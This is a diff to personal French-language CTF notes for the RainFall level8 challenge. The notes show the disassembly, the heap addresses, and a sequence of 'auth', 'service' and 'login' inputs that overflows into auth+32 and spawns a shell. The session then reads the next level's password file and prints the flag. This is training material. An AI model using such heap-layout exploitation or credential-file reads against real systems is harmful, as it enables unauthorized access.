@@ -48,7 +48,7 @@ seulement un main
 desassemblage:
 
 char *auth;   // 08049aac
-int service;  // 08049ab0 (stocke en fait un pointeur retourné par strdup)
+int service;  // 08049ab0
 
 int main(int argc, const char **argv, const char **envp)
 {
@@ -97,16 +97,65 @@ test
 
 level8@RainFall:~$ ./level8
 (nil), (nil)
-servicef
+servic titi
 (nil), 0x804a008
-
 
 pour auth on regarde a partir de apres "auth " en comptant l'espace
 
-pour service on regarde juste apres "service" car v6 commence 7 octets 
- apres le dedbut de buf
+pour service on regarde juste  "servic" car memcmp check seulemnt 6 char
+et v6 commence 7 octets apres le debut de buf donc
+
+level8@RainFall:~$ ./level8
+(nil), (nil)
+servicef
+(nil), 0x804a008
 
 Il faut que j'arrive a mettre des data dans *((_DWORD *)auth + 8) 
 donc a 32 octets apres le debut de auth 
 
 un overflow du malloc
+
+il faut connaitre l'adresse de *((_DWORD *)auth + 8)
+puis utiliser le strcpy de auth 
+puis utiliser le strdup 
+
+level8@RainFall:~$ ./level8
+(nil), (nil)
+auth test
+0x804a008, (nil)
+service test
+0x804a008, 0x804a018
+servic test
+0x804a008, 0x804a028
+servcice de
+0x804a008, 0x804a028
+servic de
+0x804a008, 0x804a038
+service
+0x804a008, 0x804a048
+
+
+10 octets d'ecart entre les 2 adresses
+
+rien de special a faire a part une suite de service puis login 
+
+level8@RainFall:~$ ./level8
+(nil), (nil)
+auth test
+0x804a008, (nil)
+service test
+0x804a008, 0x804a018
+servic test
+0x804a008, 0x804a028
+servcice de
+0x804a008, 0x804a028
+servic de
+0x804a008, 0x804a038
+service
+0x804a008, 0x804a048
+login
+$ pwd
+/home/user/level8
+$ cat /home/user/level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+$
